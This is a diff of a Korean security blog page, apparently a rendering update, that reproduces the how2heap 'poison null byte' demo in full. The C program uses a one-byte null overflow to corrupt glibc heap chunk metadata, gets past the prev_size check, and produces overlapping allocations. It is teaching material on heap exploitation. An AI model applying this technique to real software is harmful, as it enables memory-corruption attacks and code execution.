@@ -20,18 +20,18 @@
     
         <meta name="keywords" content="Theory">
     
-    <meta name="description" content="Poison_null_byte.c 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949">
+    <meta name="description" content="Poison_null_byte.c #include &amp;lt;stdio.h&amp;gt; #include &amp;lt;stdlib.h&amp;gt; #include &amp;lt;string.h&amp;gt; #include &amp;lt;stdint.h&amp;gt; #include &amp;lt;malloc.h&amp;gt;   int main() { fprintf(stderr, &quot;null byte 2.0!\n&quot;);">
 <meta name="keywords" content="Theory">
 <meta property="og:type" content="article">
 <meta property="og:title" content="[How2Heap] Poison_null_byte">
 <meta property="og:url" content="http://j0n9hyun.github.io/2019/05/31/How2Heap-Poison-null-byte/index.html">
 <meta property="og:site_name" content="j0n9hyun">
-<meta property="og:description" content="Poison_null_byte.c 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949">
+<meta property="og:description" content="Poison_null_byte.c #include &amp;lt;stdio.h&amp;gt; #include &amp;lt;stdlib.h&amp;gt; #include &amp;lt;string.h&amp;gt; #include &amp;lt;stdint.h&amp;gt; #include &amp;lt;malloc.h&amp;gt;   int main() { fprintf(stderr, &quot;null byte 2.0!\n&quot;);">
 <meta property="og:locale" content="ko">
 <meta property="og:updated_time" content="2019-05-31T02:54:24.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="[How2Heap] Poison_null_byte">
-<meta name="twitter:description" content="Poison_null_byte.c 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949">
+<meta name="twitter:description" content="Poison_null_byte.c #include &amp;lt;stdio.h&amp;gt; #include &amp;lt;stdlib.h&amp;gt; #include &amp;lt;string.h&amp;gt; #include &amp;lt;stdint.h&amp;gt; #include &amp;lt;malloc.h&amp;gt;   int main() { fprintf(stderr, &quot;null byte 2.0!\n&quot;);">
     
 	<link rel="canonical" href="http://j0n9hyun.github.io/2019/05/31/how2heap-poison-null-byte/">
 
@@ -62,7 +62,7 @@
     
 
 
-</head>
+<link rel="stylesheet" href="/css/prism.css" type="text/css"></head>
 </html>
 <body>
     <div id="wrap">
@@ -88,7 +88,7 @@
                                         <ul class="main-nav-list"><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/Daily/">Daily</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/Theory/">Theory</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/WriteUps/">WriteUps</a><ul class="main-nav-list-child"><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/WriteUps/Crypto/">Crypto</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/WriteUps/Foren/">Foren</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/WriteUps/Misc/">Misc</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/WriteUps/Pwn/">Pwn</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/WriteUps/Script/">Script</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/WriteUps/Web/">Web</a></li></ul></li></ul>
                                     
                                 <li class="main-nav-list-item">
-                                    <a class="main-nav-list-link" href="https://about.me/j0n9hyun">About</a>
+                                    <a class="main-nav-list-link" href="/about">About</a>
                                 </li>
                             
                         </ul>
@@ -180,13 +180,118 @@
         <a class="tag-link" href="/tags/Theory/">Theory</a>
     </div>
 
-  			<span class="reading-time">⏱ 9 분</span>
+  			<span class="reading-time">⏱ 6 분</span>
             </div>
         
         
         <div class="article-entry" itemprop="articleBody">
             <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><h3 id="poison_null_bytec"><a class="markdownIt-Anchor" href="#poison_null_bytec"></a> Poison_null_byte.c</h3>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"null byte 2.0!\n"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"테스트 환경: Ubuntu 14.04 64bit.\n"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"이 기법은 glibc에서 tcache 옵션이 disabled된 상태에만 작동한다.\n"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"이 기법은 null바이트를 이용하여 malloc된 영역으로 off-by-one할때 사용할 수 있다.\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint8_t</span>* a;</span><br><span class="line"><span class="keyword">uint8_t</span>* b;</span><br><span class="line"><span class="keyword">uint8_t</span>* c;</span><br><span class="line"><span class="keyword">uint8_t</span>* b1;</span><br><span class="line"><span class="keyword">uint8_t</span>* b2;</span><br><span class="line"><span class="keyword">uint8_t</span>* d;</span><br><span class="line"><span class="keyword">void</span> *barrier;</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"'a'에 0x100 bytes 할당한다.\n"</span>);</span><br><span class="line">a = (<span class="keyword">uint8_t</span>*) <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"a: %p\n"</span>, a);</span><br><span class="line"><span class="keyword">int</span> real_a_size = malloc_usable_size(a);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"우리는 'a'에 overflow가 발생하는 것을 원하기 때문에, 'a'의 '진짜' 크기를 알 필요가 있다. "</span></span><br><span class="line"><span class="string">"(반올림 때문에 0x100 이상이 될 수 있음): %#x\n"</span>, real_a_size);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* chunk size attribute cannot have a least significant byte with a value of 0x00.</span></span><br><span class="line"><span class="comment">* the least significant byte of this will be 0x10, because the size of the chunk includes</span></span><br><span class="line"><span class="comment">* the amount requested plus some amount required for the metadata. */</span></span><br><span class="line">b = (<span class="keyword">uint8_t</span>*) <span class="built_in">malloc</span>(<span class="number">0x200</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"b: %p\n"</span>, b);</span><br><span class="line"></span><br><span class="line">c = (<span class="keyword">uint8_t</span>*) <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"c: %p\n"</span>, c);</span><br><span class="line"></span><br><span class="line">barrier =  <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"barrier를 %p에 할당하면, c는 free될 때 top-chunk로 consolidate되지 않는다.\n"</span></span><br><span class="line"><span class="string">"barrier가 엄격하게 필요한 건 아니지만 상황을 덜 혼란스럽게 만든다.\n"</span>, barrier);</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span>* b_size_ptr = (<span class="keyword">uint64_t</span>*)(b - <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// added fix for size==prev_size(next_chunk) check in newer versions of glibc</span></span><br><span class="line"><span class="comment">// https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=17f487b7afa7cd6c316040f3e6c86dc96b2eec30</span></span><br><span class="line"><span class="comment">// this added check requires we are allowed to have null pointers in b (not just a c string)</span></span><br><span class="line"><span class="comment">//*(size_t*)(b+0x1f0) = 0x200;</span></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"glibc의 새 버전에서 'chunksize(P) != prev_size (next_chunk(P))' 검사를 통과하려면 b안에 변경된(updated) 크기를 가지고 있어야 한다.\n"</span>);</span><br><span class="line"><span class="comment">// we set this location to 0x200 since 0x200 == (0x211 &amp; 0xff00)</span></span><br><span class="line"><span class="comment">// which is the value of b.size after its first byte has been overwritten with a NULL byte</span></span><br><span class="line">*(<span class="keyword">size_t</span>*)(b+<span class="number">0x1f0</span>) = <span class="number">0x200</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// this technique works by overwriting the size metadata of a free chunk</span></span><br><span class="line"><span class="built_in">free</span>(b);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"b.size: %#lx\n"</span>, *b_size_ptr);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"b.size: (0x200 + 0x10) | prev_in_use\n"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"우리는 'b'의 metadata에 있는 single null byte를 이용해서 'a'를 overflow한다.\n"</span>);</span><br><span class="line">a[real_a_size] = <span class="number">0</span>; <span class="comment">// exploit된 bug "</span></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"b.size: %#lx\n"</span>, *b_size_ptr);</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span>* c_prev_size_ptr = ((<span class="keyword">uint64_t</span>*)c)<span class="number">-2</span>;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"c.prev_size: %#lx\n"</span>,*c_prev_size_ptr);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 이 malloc은 b였던 chunk에서 unlink를 호출하는 결과일 것이다.</span></span><br><span class="line"><span class="comment">// The added check (commit id: 17f487b), if not properly handled as we did before,</span></span><br><span class="line"><span class="comment">// will detect the heap corruption now.</span></span><br><span class="line"><span class="comment">// The check is this: chunksize(P) != prev_size (next_chunk(P)) where</span></span><br><span class="line"><span class="comment">// P == b-0x10, chunksize(P) == *(b-0x10+0x8) == 0x200 (was 0x210 before the overflow)</span></span><br><span class="line"><span class="comment">// next_chunk(P) == b-0x10+0x200 == b+0x1f0</span></span><br><span class="line"><span class="comment">// prev_size (next_chunk(P)) == *(b+0x1f0) == 0x200</span></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"우리는 chunksize(P) == %#lx == %#lx == prev_size (next_chunk(P)) 이후로 검사를 통과할 것이다.\n"</span>,</span><br><span class="line">*((<span class="keyword">size_t</span>*)(b<span class="number">-0x8</span>)), *(<span class="keyword">size_t</span>*)(b<span class="number">-0x10</span> + *((<span class="keyword">size_t</span>*)(b<span class="number">-0x8</span>))));</span><br><span class="line">b1 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"b1: %p\n"</span>,b1);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"이제 우리는 'b1'을 malloc한다. 그것은 'b'에 있던 곳에 위치할 것이다. "</span></span><br><span class="line"><span class="string">"이 시점에서 c.prev_size가 변경됐어야 했지만, 그렇지 않았다: %#lx\n"</span>,*c_prev_size_ptr);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"흥미롭게도, c.prev_size의 변경된 값은 c.prev_size 앞에 0x10 bytes로 write됐다: %lx\n"</span>,*(((<span class="keyword">uint64_t</span>*)c)<span class="number">-4</span>));</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"'victim' chunk에 'b2'를 malloc한다.\n"</span>);</span><br><span class="line"><span class="comment">// 보통 b2(victim)는 우리가 조작할 수 있는 취약한 포인터를 가진 구조일 것이다.</span></span><br><span class="line"></span><br><span class="line">b2 = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"b2: %p\n"</span>,b2);</span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span>(b2,<span class="string">'B'</span>,<span class="number">0x80</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"현재 b2 content:\n%s\n"</span>,b2);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"이제 우리는 'b1'과 c를 free한다: 'b1'과 'c'청크는 consolidate될 것이다.(b2를 잊어버리고)\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(b1);</span><br><span class="line"><span class="built_in">free</span>(c);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"마지막으로, 'd'를 할당해서 'b2'를 overlapping한다.\n"</span>);</span><br><span class="line">d = <span class="built_in">malloc</span>(<span class="number">0x300</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"d: %p\n"</span>,d);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"'d'와 'b2'가 overlap되었다.\n"</span>);</span><br><span class="line"><span class="built_in">memset</span>(d,<span class="string">'D'</span>,<span class="number">0x300</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"바뀐 b2 content:\n%s\n"</span>,b2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre class="highlight"><code class="c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdint.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;malloc.h&gt;</span></span>
+
+
+<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span>
+</span>{
+<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"null byte 2.0!\n"</span>);
+<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"테스트 환경: Ubuntu 14.04 64bit.\n"</span>);
+<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"이 기법은 glibc에서 tcache 옵션이 disabled된 상태에만 작동한다.\n"</span>);
+<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"이 기법은 null바이트를 이용하여 malloc된 영역으로 off-by-one할때 사용할 수 있다.\n"</span>);
+
+<span class="hljs-keyword">uint8_t</span>* a;
+<span class="hljs-keyword">uint8_t</span>* b;
+<span class="hljs-keyword">uint8_t</span>* c;
+<span class="hljs-keyword">uint8_t</span>* b1;
+<span class="hljs-keyword">uint8_t</span>* b2;
+<span class="hljs-keyword">uint8_t</span>* d;
+<span class="hljs-keyword">void</span> *barrier;
+
+<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"'a'에 0x100 bytes 할당한다.\n"</span>);
+a = (<span class="hljs-keyword">uint8_t</span>*) <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);
+<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"a: %p\n"</span>, a);
+<span class="hljs-keyword">int</span> real_a_size = malloc_usable_size(a);
+<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"우리는 'a'에 overflow가 발생하는 것을 원하기 때문에, 'a'의 '진짜' 크기를 알 필요가 있다. "</span>
+<span class="hljs-string">"(반올림 때문에 0x100 이상이 될 수 있음): %#x\n"</span>, real_a_size);
+
+<span class="hljs-comment">/* chunk size attribute cannot have a least significant byte with a value of 0x00.
+* the least significant byte of this will be 0x10, because the size of the chunk includes
+* the amount requested plus some amount required for the metadata. */</span>
+b = (<span class="hljs-keyword">uint8_t</span>*) <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x200</span>);
+
+<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"b: %p\n"</span>, b);
+
+c = (<span class="hljs-keyword">uint8_t</span>*) <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);
+<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"c: %p\n"</span>, c);
+
+barrier =  <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);
+<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"barrier를 %p에 할당하면, c는 free될 때 top-chunk로 consolidate되지 않는다.\n"</span>
+<span class="hljs-string">"barrier가 엄격하게 필요한 건 아니지만 상황을 덜 혼란스럽게 만든다.\n"</span>, barrier);
+
+<span class="hljs-keyword">uint64_t</span>* b_size_ptr = (<span class="hljs-keyword">uint64_t</span>*)(b - <span class="hljs-number">8</span>);
+
+<span class="hljs-comment">// added fix for size==prev_size(next_chunk) check in newer versions of glibc</span>
+<span class="hljs-comment">// https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=17f487b7afa7cd6c316040f3e6c86dc96b2eec30</span>
+<span class="hljs-comment">// this added check requires we are allowed to have null pointers in b (not just a c string)</span>
+<span class="hljs-comment">//*(size_t*)(b+0x1f0) = 0x200;</span>
+<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"glibc의 새 버전에서 'chunksize(P) != prev_size (next_chunk(P))' 검사를 통과하려면 b안에 변경된(updated) 크기를 가지고 있어야 한다.\n"</span>);
+<span class="hljs-comment">// we set this location to 0x200 since 0x200 == (0x211 &amp; 0xff00)</span>
+<span class="hljs-comment">// which is the value of b.size after its first byte has been overwritten with a NULL byte</span>
+*(<span class="hljs-keyword">size_t</span>*)(b+<span class="hljs-number">0x1f0</span>) = <span class="hljs-number">0x200</span>;
+
+<span class="hljs-comment">// this technique works by overwriting the size metadata of a free chunk</span>
+<span class="hljs-built_in">free</span>(b);
+
+<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"b.size: %#lx\n"</span>, *b_size_ptr);
+<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"b.size: (0x200 + 0x10) | prev_in_use\n"</span>);
+<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"우리는 'b'의 metadata에 있는 single null byte를 이용해서 'a'를 overflow한다.\n"</span>);
+a[real_a_size] = <span class="hljs-number">0</span>; <span class="hljs-comment">// exploit된 bug "</span>
+<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"b.size: %#lx\n"</span>, *b_size_ptr);
+
+<span class="hljs-keyword">uint64_t</span>* c_prev_size_ptr = ((<span class="hljs-keyword">uint64_t</span>*)c)<span class="hljs-number">-2</span>;
+<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"c.prev_size: %#lx\n"</span>,*c_prev_size_ptr);
+
+<span class="hljs-comment">// 이 malloc은 b였던 chunk에서 unlink를 호출하는 결과일 것이다.</span>
+<span class="hljs-comment">// The added check (commit id: 17f487b), if not properly handled as we did before,</span>
+<span class="hljs-comment">// will detect the heap corruption now.</span>
+<span class="hljs-comment">// The check is this: chunksize(P) != prev_size (next_chunk(P)) where</span>
+<span class="hljs-comment">// P == b-0x10, chunksize(P) == *(b-0x10+0x8) == 0x200 (was 0x210 before the overflow)</span>
+<span class="hljs-comment">// next_chunk(P) == b-0x10+0x200 == b+0x1f0</span>
+<span class="hljs-comment">// prev_size (next_chunk(P)) == *(b+0x1f0) == 0x200</span>
+<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"우리는 chunksize(P) == %#lx == %#lx == prev_size (next_chunk(P)) 이후로 검사를 통과할 것이다.\n"</span>,
+*((<span class="hljs-keyword">size_t</span>*)(b<span class="hljs-number">-0x8</span>)), *(<span class="hljs-keyword">size_t</span>*)(b<span class="hljs-number">-0x10</span> + *((<span class="hljs-keyword">size_t</span>*)(b<span class="hljs-number">-0x8</span>))));
+b1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);
+
+<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"b1: %p\n"</span>,b1);
+<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"이제 우리는 'b1'을 malloc한다. 그것은 'b'에 있던 곳에 위치할 것이다. "</span>
+<span class="hljs-string">"이 시점에서 c.prev_size가 변경됐어야 했지만, 그렇지 않았다: %#lx\n"</span>,*c_prev_size_ptr);
+<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"흥미롭게도, c.prev_size의 변경된 값은 c.prev_size 앞에 0x10 bytes로 write됐다: %lx\n"</span>,*(((<span class="hljs-keyword">uint64_t</span>*)c)<span class="hljs-number">-4</span>));
+<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"'victim' chunk에 'b2'를 malloc한다.\n"</span>);
+<span class="hljs-comment">// 보통 b2(victim)는 우리가 조작할 수 있는 취약한 포인터를 가진 구조일 것이다.</span>
+
+b2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);
+<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"b2: %p\n"</span>,b2);
+
+<span class="hljs-built_in">memset</span>(b2,<span class="hljs-string">'B'</span>,<span class="hljs-number">0x80</span>);
+<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"현재 b2 content:\n%s\n"</span>,b2);
+
+<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"이제 우리는 'b1'과 c를 free한다: 'b1'과 'c'청크는 consolidate될 것이다.(b2를 잊어버리고)\n"</span>);
+
+<span class="hljs-built_in">free</span>(b1);
+<span class="hljs-built_in">free</span>(c);
+
+<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"마지막으로, 'd'를 할당해서 'b2'를 overlapping한다.\n"</span>);
+d = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x300</span>);
+<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"d: %p\n"</span>,d);
+
+<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"'d'와 'b2'가 overlap되었다.\n"</span>);
+<span class="hljs-built_in">memset</span>(d,<span class="hljs-string">'D'</span>,<span class="hljs-number">0x300</span>);
+
+<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"바뀐 b2 content:\n%s\n"</span>,b2);
+}
+
+</code></pre>
 <p><code>null byte 2.0!</code><br>
 <code>테스트 환경: Ubuntu 14.04 64bit.</code><br>
 이 기법은 glibc에서 tcache 옵션이 disabled된 상태에만 작동한다.<br>
@@ -224,7 +329,7 @@ glibc의 새 버전에서 ‘chunksize§ != prev_size (next_chunk§)’ 검사�
 
 
 
-    <a data-url="http://j0n9hyun.github.io/2019/05/31/How2Heap-Poison-null-byte/" data-id="cjzsg5bzb000jwnfpi0o9861x" class="article-share-link"><i class="fa fa-share"></i>공유하기</a>
+    <a data-url="http://j0n9hyun.github.io/2019/05/31/How2Heap-Poison-null-byte/" data-id="ck00o3nqe000gz7fp1gw5o6er" class="article-share-link"><i class="fa fa-share"></i>공유하기</a>
 <script>
     (function ($) {
         $('body').on('click', function() {
@@ -303,8 +408,17 @@ glibc의 새 버전에서 ‘chunksize§ != prev_size (next_chunk§)’ 검사�
         "dateModified": "2019-05-31",
         "url": "http://j0n9hyun.github.io/2019/05/31/How2Heap-Poison-null-byte/",
         "description": " Poison_null_byte.c
-123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949"
-        "wordCount": 988
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;stdint.h&gt;
+#include &lt;malloc.h&gt;
+
+
+int main()
+{
+fprintf(stderr, "null byte 2.0!\n");"
+        "wordCount": 775
     }
 </script>
 
@@ -417,6 +531,8 @@ glibc의 새 버전에서 ‘chunksize§ != prev_size (next_chunk§)’ 검사�
     </div>
 
 
+            
+                
             
                 
     <div class="widget-wrap widget-list">
